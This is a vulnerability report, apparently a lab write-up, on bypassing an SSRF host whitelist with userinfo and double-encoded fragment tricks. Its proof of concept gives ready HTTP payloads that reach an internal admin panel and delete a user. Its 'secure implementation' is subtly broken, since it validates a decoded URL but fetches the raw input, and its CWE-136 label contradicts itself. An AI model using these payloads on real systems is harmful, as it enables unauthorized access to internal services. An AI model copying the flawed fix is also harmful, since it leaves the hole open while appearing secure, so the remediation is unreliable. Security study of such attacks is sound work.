# Vulnerability Report: Server-Side Request Forgery (SSRF) Bypassing Whitelist Filters via URL Parser Differentials and Double Encoding

* **Vulnerability Type:** Server-Side Request Forgery (SSRF) (CWE-918) / Improper Input Validation (CWE-20) / URL Parsing Inconsistency (CWE-136)

* **Severity:** High

* **Target Component:** Stock Check API (`/product/stock` via `stockApi` parameter)

* **OWASP Top 10 Mapping:** A10:2021 – Server-Side Request Forgery (SSRF)

## 1. Executive Summary

A Server-Side Request Forgery (SSRF) vulnerability was identified in the product stock checking mechanism. The feature incorporates a host whitelist defense requiring target URLs to match a specific trusted domain (`stock.weliketoshop.net`). However, due to URL parsing inconsistencies between the validation filter and the backend HTTP client—combined with double URL encoding of fragment characters (`#` encoded as `%2523`)—an unauthenticated remote attacker can bypass the whitelist controls. This allows access to sensitive loopback resources (`http://localhost/admin`) and execution of administrative actions.

## 2. Technical Analysis & Root Cause

The application validates the `stockApi` input against a strict whitelist of hostnames before executing the HTTP request.

### URL Structure & Parser Discrepancy

A standard RFC 3986 URL uses the following format:
`scheme://userinfo@host:port/path?query#fragment`

1. **User Authentication Handling (`@`):**
   Providing `http://localhost@stock.weliketoshop.net/` causes naive regex filters to observe `stock.weliketoshop.net` as the host. However, the destination host is still `stock.weliketoshop.net`, using `localhost` as user authentication metadata.

2. **Fragment Identifier (`#`):**
   Adding a fragment symbol (`#`) shifts everything following it to fragment status, which is ignored by the HTTP client when making the socket connection.

3. **Double Encoding Flaw:**
   The validation filter URL-decodes the payload once:
   * Input Payload: `http://localhost%2523@stock.weliketoshop.net/`
   * First Decode (Filter Validation): `http://localhost%23@stock.weliketoshop.net/`
   * Filter Inspection: The filter does not register `%23` as a literal fragment character `#`, treating the host string as `stock.weliketoshop.net` and passing validation.
   * Second Decode (Backend Client): Resolves `%23` to `#`, producing `http://localhost#@stock.weliketoshop.net/`. The backend HTTP client connects to target host `localhost` and discards `#@stock.weliketoshop.net/` as fragment data.

## 3. Proof of Concept (PoC)

1. Intercept a stock check request (`POST /product/stock`) using an HTTP proxy (e.g., Burp Suite).

2. **Test Whitelist Filter:**
   Submit `stockApi=http://localhost` or `stockApi=http://127.0.0.1`.
   *Response:* `400 Bad Request` or `"External stock check blocked"`.

3. **Test Credential Syntax Bypass:**
   Submit `stockApi=http://localhost@stock.weliketoshop.net/`.
   *Response:* `500 Internal Server Error` (indicates the whitelist filter passed, but the connection targeted the remote host with user credentials).

4. **Construct Double URL-Encoded Fragment Payload:**
   Encode `#` once (`%23`), then encode the `%` character again (`%2523`):

   ```
   POST /product/stock HTTP/1.1
   Host: target-app.net
   Content-Type: application/x-www-form-urlencoded
   
   stockApi=http://localhost%2523@stock.weliketoshop.net/admin
   ```

   *Result:* The filter validates `stock.weliketoshop.net`, but the backend HTTP client connects to `http://localhost/admin` and returns the local administration panel (`200 OK`).

5. **Execute Privileged Action:**
   Append the user deletion parameters to the endpoint:

   ```
   POST /product/stock HTTP/1.1
   Host: target-app.net
   Content-Type: application/x-www-form-urlencoded
   
   stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
   ```

6. **Result:** User `carlos` is deleted on the loopback interface.

## 4. Impact

* **Whitelist Bypass:** Complete evasion of domain-level restrictions due to URL parser differentials.
* **Unauthorized Access:** Exposure of internal management endpoints hosted on local interfaces.
* **Unauthorized Functionality:** Execution of privileged administrative commands.

## 5. Remediation & Developer Guidance

### Primary Fixes

1. **Use Standardized URL Parsers for Validation:**
   Do not use regular expressions or custom string matching for URL validation. Use the exact same built-in URL parsing library for input validation that is used by the backend HTTP client executing the request.

2. **Canonicalize URLs Before Validation:**
   Fully decode and normalize the URL input prior to parsing hostnames, paths, and query parameters.

3. **Restrict Downstream Connections via Network Controls:**
   Implement strict egress filtering at the network level and ensure loopback (`127.0.0.1`, `localhost`) interfaces are not reachable by public-facing application processes.

#### Secure Implementation Example (Python)

```python
import urllib.parse
import requests

ALLOWED_DOMAINS = ["stock.weliketoshop.net"]

def validate_and_fetch_stock(user_provided_url):
    # Fully unquote input twice to resolve multi-encoded payloads before parsing
    decoded_url = urllib.parse.unquote(urllib.parse.unquote(user_provided_url))
    parsed = urllib.parse.urlparse(decoded_url)
    
    # Strictly validate extracted hostname against allowed domain
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError("Target domain is not authorized.")
        
    # Execute request using explicit parsed components
    return requests.get(user_provided_url, allow_redirects=False, timeout=3)
```

## 6. References

* **CWE-918:** [Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
* **CWE-136:** [Timing Considerations in Code Processing](https://cwe.mitre.org/data/definitions/136.html)
* **OWASP:** [Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)